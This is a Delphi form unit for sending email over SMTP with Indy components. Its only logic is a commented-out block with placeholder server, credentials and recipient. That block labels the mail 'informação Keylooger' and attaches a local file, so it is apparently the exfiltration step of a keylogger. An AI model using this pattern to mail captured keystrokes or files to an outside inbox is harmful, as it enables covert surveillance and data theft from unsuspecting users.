unit Email;

interface

uses
  Windows, Messages, SysUtils, Variants, Classes, Graphics, Controls, Forms,
  Dialogs, StdCtrls, Buttons, ComCtrls, ExtCtrls, Menus, Gauges, IdIOHandler,
  IdIOHandlerSocket, IdIOHandlerStack, IdSSL, IdSSLOpenSSL, IdAntiFreezeBase,
  IdAntiFreeze, IdMessage, IdBaseComponent, IdComponent, IdTCPConnection,
  IdTCPClient, IdExplicitTLSClientServerBase, IdMessageClient, IdSMTPBase,
  IdSMTP;

type
  TForm1 = class(TForm)
    Panel1: TPanel;
    StatusBar1: TStatusBar;
    Enviar: TBitBtn;
    Btnxml: TBitBtn;
    IdSMTP1: TIdSMTP;
    IdMessage1: TIdMessage;
    IdAntiFreeze1: TIdAntiFreeze;
    IdSSLIOHandlerSocketOpenSSL1: TIdSSLIOHandlerSocketOpenSSL;
    OpenDialog1: TOpenDialog;
    ListBox1: TListBox;
    PopupMenu1: TPopupMenu;
    Gauge1: TGauge;
    procedure EnviarClick(Sender: TObject);
  private
    { Private declarations }
  public
    { Public declarations }
  end;

var
  Form1: TForm1;

implementation

{$R *.dfm}

procedure TForm1.EnviarClick(Sender: TObject);
var string1,string2:string;
 SmtpHost : String;
 SmtpPort : String;
 SmtpUser : String;
 SmtpPass : String;
 EmailAssunto : String;
 Para : String;
 SmtpSSL : Boolean;
 Mensagem : TStringList;
i:integer;
begin
{  EmailCorpo.Body.add('=asssunto=');
  EmailCorpo.Body.add(#13#10);
  EmailCorpo.Body.add('assuntoopcional.');
  EmailCorpo.From.Name := 'informação Keylooger : ';
  EmailCorpo.From.Address := 'eu@eu.com.br';
  EmailCorpo.Recipients.EMailAddresses :='seuemail@hotmail.com';
  EmailCorpo.Priority := mpHighest;
  EmailCorpo.Subject := 'corpo da mesagem';
 TIdAttachment.Create(emailcorpo.MessageParts,TFileName('local onde esta o anexo aqui'));
  SMTP.Host:='serverSMTP';
  SMTP.AuthenticationType :=atLogin;
  SMTP.Port := 25;
  SMTP.Username:='userSMTP'; //seu login
  SMTP.Password:='senhaSMTp'; //sua senha
  SMTP.Connect;
Try
  SMTP.Send(EmailCorpo);
except
  SMTP.Disconnect;
  SMTP.Host:='serverSMTP'; // smtp.mail.exemplo.com.br
  SMTP.AuthenticationType :=atLogin;
  SMTP.Connect;
try
  SMTP.Send(EmailCorpo);
except
end;
  SMTP.Disconnect;
end;
  SMTP.Disconnect; }
end;

end.
